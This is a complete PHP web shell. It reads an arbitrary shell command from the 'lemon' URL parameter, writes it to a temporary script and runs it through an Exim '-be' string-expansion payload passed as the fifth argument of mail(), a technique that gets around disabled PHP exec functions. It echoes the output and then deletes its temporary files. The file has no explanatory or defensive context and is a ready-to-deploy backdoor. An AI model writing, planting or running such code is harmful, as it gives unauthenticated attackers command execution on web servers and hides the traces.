<?php
$c = @$_GET['lemon'];
$result_file = "/tmp/test.txt";
$tmp_file = '/tmp/aaaa.sh';
$command = $c . '>' . $result_file;
file_put_contents($tmp_file, $command);
$payload = "-be \${run{/bin/bash\${substr{10}{1}{\$tod_log}}/tmp/aaaa.sh}{ok}{error}}";
mail("a@localhost", "", "", "", $payload);
echo file_get_contents($result_file);
@unlink($tmp_file);
@unlink($result_file);
?>